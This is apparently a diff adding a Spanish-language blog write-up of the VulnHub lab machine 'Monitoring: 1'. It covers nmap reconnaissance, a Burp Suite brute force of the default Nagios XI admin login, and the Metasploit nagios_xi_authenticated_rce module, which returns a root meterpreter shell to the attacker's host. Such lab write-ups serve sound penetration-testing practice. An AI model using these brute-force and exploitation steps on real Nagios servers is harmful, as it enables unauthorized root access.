@@ -1,0 +1,167 @@
+---
+layout: post
+
+title: "Writeup Monitoring 1"
+excerpt: 'En este post te llevo paso a paso por la máquina Monitoring: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "Writeups"
+kicker_secondary: "VulnHub"
+tags:
+- 'VulnHub'
+
+post_title: "Writeup Monitoring 1"
+description: "En este post te llevo paso a paso por la máquina Monitoring: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting"
+
+slug: monitoring
+permalink: /blog/writeups/monitoring.html
+
+nav: blog
+
+featured: false
+featured_badge: ""
+featured_lines:
+  - "Burp Suite"
+  - "Default User"
+
+cover_badge: "VulnHub"
+cover_lines:
+  - "Burp Suite"
+  - "Default User"
+
+cover_image: /assets/img/blog/monitoring-1/featured_image_monitoring.jpg
+
+reading_time: "3 min de lectura"
+date: 2024-02-01 10:00:00 +0100
+
+toc_html: |
+  <a href="#resolucion-de-la-maquina">Resolucion de la maquina</a>
+---
+
+<p>En este post te llevo paso a paso por la máquina Monitoring: 1, un desafío de nivel fácil disponible en VulnHub.
+Diseñada para quienes desean mejorar en el pentesting</p>
+<h2 id="resolucion-de-la-maquina">Resolucion de la maquina</h2>
+<h3>Fase de Fingerprinting / Reconocimiento (Reconnaissance):</h3>
+<h4>Descubrimiento de IP objetivo en la red</h4>
+<p>Lanzo <code>sudo netdiscover -i eth0 -r 192.168.88.0/24</code> para descubrir los hosts en la red</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image.png"/></p>
+<p>Una vez obtenida la IP de la maquina objetivo la guardo en la variable IP.</p>
+<pre><code class="language-sh">export IP=192.168.88.11
+</code></pre>
+<p>Lanzo un escaneo con nmap para ver los puertos que tiene disponible.</p>
+<pre><code class="language-sh">nmap -p- $IP 
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-3.png"/></p>
+<pre><code class="language-sh">PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+389/tcp  open  ldap
+443/tcp  open  https
+5667/tcp open  unknown
+</code></pre>
+<p>Voy a redirigir esta salida a awk y grep para obtener una lista separada por comas para poder exportarla a la variable PORTS y despues usarla en el scaneo detallado.</p>
+<pre><code class="language-sh">nmap -p- $IP | awk '{print $1}' | grep -E '^[0-9]+' | cut -d'/' -f1 | paste -sd, - &gt; puertos.txt
+cat puertos.txt   
+export PORTS=22,25,80,389,443,5667
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-4.png"/></p>
+<p>Ahora usando la variable PORTS realizo un escaneo en mas profundidad.</p>
+<pre><code class="language-sh">sudo nmap -p$PORTS -sS -sV -sC $IP -O -oA scan_nmap_$IP
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-5.png"/></p>
+<h4>Descubrimiento de puertos y servicios en el host objetivo</h4>
+<p>Resultado de la exploracion de los servicios en los puertos detectados:</p>
+<h5>Puerto 22 - SSH</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
+|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
+|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
+</code></pre>
+<h5>Puerto 25 - SMTP</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+25/tcp   open  smtp       Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-09-08T17:59:00
+|_Not valid after:  2030-09-06T17:59:00
+|_ssl-date: TLS randomness does not represent time
+</code></pre>
+<h5>Puerto 80 - HTTP</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Nagios XI
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+</code></pre>
+<h5>Puerto 389 - LDAP</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+</code></pre>
+<h5>Puerto 443 - HTTPS</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
+| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-09-08T18:28:08
+|_Not valid after:  2030-09-06T18:28:08
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Nagios XI
+</code></pre>
+<h5>Puerto 5667</h5>
+<pre><code class="language-txt">PORT     STATE SERVICE    VERSION
+5667/tcp open  tcpwrapped
+
+</code></pre>
+<h5>Informacion general de la maquina</h5>
+<pre><code class="language-txt">Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+</code></pre>
+<h3>Fase de Footprinting / Exploración (Scanning):</h3>
+<h4>Exploracion puerto 80</h4>
+<p>Realizo una exploracion visual de la web que sirve el puerto 80 que me lleva a una pagina de bienvenida que me da el acceso a <strong>Nagios XI</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-6.png"/></p>
+<p>Accedo y llego a una pagina donde hay un formulario de acceso y algo de informacion nada relevante.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-7.png"/></p>
+<p>Como no conozco este servicio Nagios en nada, consulto en Google si tiene usuario predeterminado. Obtengo de esta forma que el usuario predeterminado es nagiosadmin y que la clave se define en el primer acceso al sitio.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-12.png"/></p>
+<p>Si el administrador de la maquina no ha tenido cuidado con este detalle deshabilitando el usuario por defecto es probable que pueda atacarlo con un ataque de fuerza bruta y quizas obtener acceso.</p>
+<p>Para este ataque uso Burp-Suite, defino un ataque de tipo cluster bomb para usar el payload 1 como username y el payload 2 como password.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-11.png"/></p>
+<p>En el payload 1 defino como usuario <strong>nagiosadmin</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-9.png"/></p>
+<p>En el payload 2 cargo un diccionario basico de claves <strong>unix_password.txt</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-10.png"/></p>
+<p>A continuacion lanzo el ataque y veo que en la primera de las claves probadas el valor de length es diferente por mucho a los demas. Lo que me indica que es una clave valida.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-8.png"/></p>
+<p>Compruebo las credenciales <strong>[nagiosadmin:admin]</strong> y obtengo acceso al sistema Nagios.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-13.png"/></p>
+<p>Una vez dentro veo que el sistema me da informacion sobre su version</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-14.png"/></p>
+<h3>Explotación</h3>
+<p>Para explotar el sistema usare metasploit.</p>
+<p>Busco en metasploit vulnerabilidades conocidas para <strong>nagios xi</strong> mediante el comando:</p>
+<pre><code class="language-sh">search nagios xi
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-16.png"/></p>
+<p>Selecciono el modulo nagios_xi_authenticated_rce y defino los valores necesarios despues de consultarlos en options.</p>
+<pre><code class="language-sh">use exploit/linux/http/nagios_xi_authenticated_rce
+options
+set password admin
+set LHOST 192.168.88.3
+exploit
+</code></pre>
+<p>Esto nos da una sesion de meterpreter.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-17.png"/></p>
+<p>Si consulto que usuario tengo en la sesion de meterpreter, me devuelve que tengo el usuario root.</p>
+<p><img alt="alt text" src="/assets/img/blog/monitoring-1/image-18.png"/></p>
+<p>Con este usuario puedo acceder a la carpeta /root/ y leer el fichero proof.txt para obtener la flag de solucion de la maquina.</p>
